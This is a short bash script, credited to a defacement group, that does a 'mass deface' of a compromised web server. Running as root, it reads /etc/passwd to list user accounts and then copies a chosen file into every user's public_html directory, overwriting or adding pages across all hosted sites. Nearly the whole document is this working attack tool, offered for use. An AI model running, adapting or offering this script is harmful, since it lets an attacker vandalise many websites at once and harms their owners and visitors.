#!/bin/bash
args=("$@")
UHOME="/home"
FILE=$(pwd)"/"${args[0]}
priv=$([ $(id -u) == 0 ] && echo " hadi basliyalim..........." || echo " bu dosyayi calistirabilmeniz icin root olman�z gerekiyor :)")

echo " ~~~~~     Mass Deface (root)    ~~~~~ "
echo " ~~      Edited by: ImRyMaTem    ~~ "
echo " ~    PowerKings.org     ~ "
echo "------ [ usage: ./mass file ] ------"
echo ""
echo $priv
echo ""

if [ -z "$1" ]
    then
    echo "usage: ./mass file"

else

# get list of all users
_USERS="$(awk -F':' '{ if ( $3 >= 500 ) print $1 }' /etc/passwd)"
for u in $_USERS
do
    _dir="${UHOME}/${u}/public_html"
    if [ -d "$_dir" ] && [ $(id -u) == 0 ]
    then
        /bin/cp "$FILE" "$_dir"
        if [ -e "$_dir/"$(basename "$FILE") ]
            then
            echo "[+] Ba�ar�l� ->" "$_dir/"$(basename "$FILE")
            #chown $(id -un $u):$(id -gn $u) "$_dir/"$(basename "$FILE")
        fi
    fi
done
fi